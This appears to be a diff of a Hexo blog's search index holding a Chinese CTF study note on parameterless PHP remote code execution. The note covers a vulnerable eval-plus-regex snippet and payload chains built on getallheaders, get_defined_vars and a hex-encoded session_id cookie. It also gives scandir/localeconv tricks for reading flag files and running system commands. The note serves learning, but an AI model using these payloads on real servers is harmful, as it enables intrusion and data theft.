+<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组（返回由所有已定义变量所组成的数组），我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
+<p><img src="https://s2.loli.net/2023/11/18/x9yrZGsMaQTlAoK.png" alt="image.png"></p>
+<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了。</p>
+<p>我们还可以用以下方法得到全局变量的值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取get的最后一个参数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取post的最后一个参数</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/QACtqE6daXo4kPY.png" alt="smIJOtgU6pKfZkQ"></p>
+<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
+<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line">Cookie: PHPSESSID=...</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/vorOeBqGSmPNRTL.png" alt="image.png"></p>
+<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
+<p><img src="https://s2.loli.net/2023/11/18/JruDwYiC5V39HAf.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/11/18/XbGupMPaiDNTne1.png" alt="image.png"></p>
+<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
+<p><img src="https://s2.loli.net/2023/11/18/h8DxXSvGaQzs2gj.png" alt="image.png"></p>
+<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦。</p>
+<h4 id="PHP函数绕过"><a href="#PHP函数绕过" class="headerlink" title="PHP函数绕过"></a>PHP函数绕过</h4><h5 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h5><h6 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h6><p>这个函数很好理解，就是列出选中目录中的文件和目录</p>
+<p>可以利用<code>getcwd()</code>获取当前目录</p>
+<p>故<code>scandir(grtcwd())</code>可以获取到当前目录下的文件名</p>
+<p><code>scandir(&#39;.&#39;)</code>也可以获取到当前目录下的文件名（flag.php就在当前目录）。由于是无参数RCE，不能传入参数<code>.</code>，那么如何获取<code>.</code>呢？有以下方法：</p>
+<ul>
+<li><p><code>chr(46)</code>：<code>chr(46)</code>就是<code>.</code>，那么如何获取46这个数字呢？</p>
+<ul>
+<li><p><code>chr(rand())</code>：<code>rand()</code>会随时生成一个大数，<code>chr()</code>函数会对参数进行256取余运算，因此<code>chr(rand())</code>有1&#x2F;256的概率是我们希望获取的字符。因此，可以抓包重放，平均256个包成功获取1次<code>chr(46)</code>。</p>
+</li>
+<li><p><code>chr(time())</code>：<code>time()</code>返回时间戳，一秒一变。因此使用<code>chr(time())</code>，每256秒可以获取到1次<code>chr(46)</code>。</p>
+</li>
+<li><p><code>chr(current(localtime(time())))</code>：<code>localtime(time())</code>返回一个数组，数组的0号元素表示当前时间的秒（范围是0-59），<code>current</code>是取数组的第一个元素（0号元素）。因此使<code>chr(current(localtime(time())))</code>，每60秒可以获取到1次<code>chr(46)</code>。</p>
+</li>
+</ul>
+</li>
+<li><p><code>current(localeconv())</code>：<code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组，其第一个元素就</p>
+<p>是<code>.</code>。因此<code>current(localeconv())</code>或者<code>pos(localeconv())</code>可以确定获取<code>.</code>，推荐使用该方法。</p>
+</li>
+<li><p><code>phpversion()</code>：利用php版本信息，比如：7.2.1，提取出大版本号（比如7或者5），在经过运算得到46，然后<code>chr(46)</code>得到<code>.</code>，命令为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>())))))))) <span class="comment">#版本为5或者7都可以</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>crypt()</code>：该函数会随机生成一个hash值。命令为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))</span><br><span class="line"><span class="comment"># 大概率得到$ 小概率得到.</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h6 id="查看上级目录"><a href="#查看上级目录" class="headerlink" title="查看上级目录"></a>查看上级目录</h6><p><code>dirname()</code></p>
+<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径。就如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;flag_phpbyp4ss&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;html&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>chdir()</code></p>
+<p>改变当前工作目录，就如将当前目录切换为<code>/var/www</code></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))</span><br></pre></td></tr></table></figure>
+
+<p>就可以读取<code>flag_phpbyp4ss</code>文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/18/5EUun8xS6sXQ3aA.png" alt="image.png"></p>
+<h5 id="从数组中取到目标文件（假设为flag-php）"><a href="#从数组中取到目标文件（假设为flag-php）" class="headerlink" title="从数组中取到目标文件（假设为flag.php）"></a>从数组中取到目标文件（假设为flag.php）</h5><h6 id="end-1"><a href="#end-1" class="headerlink" title="end()"></a><code>end()</code></h6><p>如果flag.php是返回数组的最后一个元素，直接用<code>end()</code>取出即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))</span><br></pre></td></tr></table></figure>
+
+<h6 id="next-array-reverse"><a href="#next-array-reverse" class="headerlink" title="next(array_reverse())"></a><code>next(array_reverse())</code></h6><p>如果flag.php是返回数组的倒数第二个元素，可以通过<code>array_reverse()</code>函数，将数组逆转。这样flag.php就是输出数组的正数第二个元素，可以通过<code>next()</code>操作取到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
+
+<h6 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a><code>array_rand(array_flip())</code></h6><p><code>array_flip()</code>是将数组的键和值交换，<code>array_rand()</code>是随机取出数组的一个键。<code>array_rand(array_flip())</code>方法就是将数组中的flag.php由值改为键，再用随机的方式取出</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_rand</span>(<span class="title function_ invoke__">array_flip</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
+
+<p>这种方法的优势是目标字符串在数组的任意位置都可以，缺点是该方法不是100%成功的，需要重放。</p>
+<h5 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>命令执行</tag>
+        <tag>RCE</tag>
       </tags>
   </entry>
   <entry>
@@ -1563,114 +1729,6 @@
       <tags>
         <tag>python</tag>
         <tag>unserialize</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>无参数RCE学习记录</title>
-    <url>/2024/03/09/%E6%97%A0%E5%8F%82%E6%95%B0RCE/</url>
-    <content><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="RCE前置知识"><a href="#RCE前置知识" class="headerlink" title="RCE前置知识"></a>RCE前置知识</h2><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>())</span><br><span class="line"><span class="title function_ invoke__">show_source</span>()</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>()))) </span><br><span class="line">cat$&#123;IFS&#125;flag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="操作数组的方法"><a href="#操作数组的方法" class="headerlink" title="操作数组的方法"></a>操作数组的方法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()/<span class="title function_ invoke__">pos</span>() - 默认返回数组第一个元素</span><br><span class="line"><span class="title function_ invoke__">end</span>() – 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">next</span>() – 将内部指针指向数组中的下一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">prev</span>() – 将内部指针指向数组中的上一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">reset</span>() – 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line"><span class="title function_ invoke__">each</span>() – 返回当前元素的键名和键值，并将内部指针向前移动，用于遍历</span><br></pre></td></tr></table></figure>
-
-<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p>
-<h3 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/xjsHJqSy7uOpTEt.png" alt="image.png"></p>
-<p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b(&#39;111&#39;));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。</p>
-<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a><code>getallheaders()</code></h4><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;please input code&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/y4DBgjpVTUtZNe1.png" alt="image.png"></p>
-<h5 id="end"><a href="#end" class="headerlink" title="end()"></a><code>end()</code></h5><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p>
-<p><img src="https://s2.loli.net/2023/11/18/s6E1xhMGV7BkvKL.png" alt="image.png"></p>
-<p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示</p>
-<p><img src="https://s2.loli.net/2023/11/18/XSg3hl9KVCG4pYs.png" alt="image.png"></p>
-<p><img src="https://s2.loli.net/2023/11/18/vHJQlgMuDy7tYio.png" alt="image.png"></p>
-<h5 id="end-被ban"><a href="#end-被ban" class="headerlink" title="end()被ban"></a><code>end()</code>被ban</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br><span class="line"><span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">getallheaders</span>()))</span><br></pre></td></tr></table></figure>
-
-<p>将数组倒置取第一个元素相当于<code>end()</code></p>
-<p>小小举个例子：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加字段</span></span><br><span class="line">test:flag.php</span><br><span class="line"><span class="comment">#访问的url</span></span><br><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#显示传输的参数</span></span><br><span class="line">?code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#执行系统命令</span></span><br><span class="line">?code=<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">getallheaders</span>())) <span class="comment">#查看文件内容</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a><code>get_defined_vars()</code></h4><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p>
-<p><img src="https://s2.loli.net/2023/11/18/klJAPxwsBIScoUa.png" alt="image.png"></p>
-<p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组（返回由所有已定义变量所组成的数组），我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p>
-<p><img src="https://s2.loli.net/2023/11/18/x9yrZGsMaQTlAoK.png" alt="image.png"></p>
-<p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了。</p>
-<p>我们还可以用以下方法得到全局变量的值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取get的最后一个参数</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">get_defined_vars</span>())) <span class="comment">#取post的最后一个参数</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/QACtqE6daXo4kPY.png" alt="smIJOtgU6pKfZkQ"></p>
-<p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>
-<h4 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a><code>session_id()</code></h4><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line">Cookie: PHPSESSID=...</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/vorOeBqGSmPNRTL.png" alt="image.png"></p>
-<p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p>
-<p><img src="https://s2.loli.net/2023/11/18/JruDwYiC5V39HAf.png" alt="image.png"></p>
-<p><img src="https://s2.loli.net/2023/11/18/XbGupMPaiDNTne1.png" alt="image.png"></p>
-<p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p>
-<p><img src="https://s2.loli.net/2023/11/18/h8DxXSvGaQzs2gj.png" alt="image.png"></p>
-<p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦。</p>
-<h4 id="PHP函数绕过"><a href="#PHP函数绕过" class="headerlink" title="PHP函数绕过"></a>PHP函数绕过</h4><h5 id="获取文件名"><a href="#获取文件名" class="headerlink" title="获取文件名"></a>获取文件名</h5><h6 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a><code>scandir()</code></h6><p>这个函数很好理解，就是列出选中目录中的文件和目录</p>
-<p>可以利用<code>getcwd()</code>获取当前目录</p>
-<p>故<code>scandir(grtcwd())</code>可以获取到当前目录下的文件名</p>
-<p><code>scandir(&#39;.&#39;)</code>也可以获取到当前目录下的文件名（flag.php就在当前目录）。由于是无参数RCE，不能传入参数<code>.</code>，那么如何获取<code>.</code>呢？有以下方法：</p>
-<ul>
-<li><p><code>chr(46)</code>：<code>chr(46)</code>就是<code>.</code>，那么如何获取46这个数字呢？</p>
-<ul>
-<li><p><code>chr(rand())</code>：<code>rand()</code>会随时生成一个大数，<code>chr()</code>函数会对参数进行256取余运算，因此<code>chr(rand())</code>有1&#x2F;256的概率是我们希望获取的字符。因此，可以抓包重放，平均256个包成功获取1次<code>chr(46)</code>。</p>
-</li>
-<li><p><code>chr(time())</code>：<code>time()</code>返回时间戳，一秒一变。因此使用<code>chr(time())</code>，每256秒可以获取到1次<code>chr(46)</code>。</p>
-</li>
-<li><p><code>chr(current(localtime(time())))</code>：<code>localtime(time())</code>返回一个数组，数组的0号元素表示当前时间的秒（范围是0-59），<code>current</code>是取数组的第一个元素（0号元素）。因此使<code>chr(current(localtime(time())))</code>，每60秒可以获取到1次<code>chr(46)</code>。</p>
-</li>
-</ul>
-</li>
-<li><p><code>current(localeconv())</code>：<code>localeconv()</code> 函数返回包含本地数字及货币信息格式的数组，其第一个元素就</p>
-<p>是<code>.</code>。因此<code>current(localeconv())</code>或者<code>pos(localeconv())</code>可以确定获取<code>.</code>，推荐使用该方法。</p>
-</li>
-<li><p><code>phpversion()</code>：利用php版本信息，比如：7.2.1，提取出大版本号（比如7或者5），在经过运算得到46，然后<code>chr(46)</code>得到<code>.</code>，命令为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ceil</span>(<span class="title function_ invoke__">sinh</span>(<span class="title function_ invoke__">cosh</span>(<span class="title function_ invoke__">tan</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">phpversion</span>())))))))) <span class="comment">#版本为5或者7都可以</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>crypt()</code>：该函数会随机生成一个hash值。命令为：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">hebrevc</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">time</span>()))))</span><br><span class="line"><span class="comment"># 大概率得到$ 小概率得到.</span></span><br></pre></td></tr></table></figure></li>
-</ul>
-<h6 id="查看上级目录"><a href="#查看上级目录" class="headerlink" title="查看上级目录"></a>查看上级目录</h6><p><code>dirname()</code></p>
-<p>如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径。就如：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">string</span>(<span class="number">13</span>) <span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line"></span><br><span class="line">?code=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">14</span>) <span class="string">&quot;flag_phpbyp4ss&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;html&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>chdir()</code></p>
-<p>改变当前工作目录，就如将当前目录切换为<code>/var/www</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))</span><br></pre></td></tr></table></figure>
-
-<p>就可以读取<code>flag_phpbyp4ss</code>文件</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://s2.loli.net/2023/11/18/5EUun8xS6sXQ3aA.png" alt="image.png"></p>
-<h5 id="从数组中取到目标文件（假设为flag-php）"><a href="#从数组中取到目标文件（假设为flag-php）" class="headerlink" title="从数组中取到目标文件（假设为flag.php）"></a>从数组中取到目标文件（假设为flag.php）</h5><h6 id="end-1"><a href="#end-1" class="headerlink" title="end()"></a><code>end()</code></h6><p>如果flag.php是返回数组的最后一个元素，直接用<code>end()</code>取出即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())))</span><br></pre></td></tr></table></figure>
-
-<h6 id="next-array-reverse"><a href="#next-array-reverse" class="headerlink" title="next(array_reverse())"></a><code>next(array_reverse())</code></h6><p>如果flag.php是返回数组的倒数第二个元素，可以通过<code>array_reverse()</code>函数，将数组逆转。这样flag.php就是输出数组的正数第二个元素，可以通过<code>next()</code>操作取到</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>()))))</span><br></pre></td></tr></table></figure>
-
-<h6 id="array-rand-array-flip"><a href="#array-rand-array-flip" class="headerlink" title="array_rand(array_flip())"></a><code>array_rand(array_flip())</code></h6><p><code>array_flip()</code>是将数组的键和值交换，<code>array_rand()</code>是随机取出数组的一个键。<code>array_rand(array_flip())</code>方法就是将数组中的flag.php由值改为键，再用随机的方式取出</p>
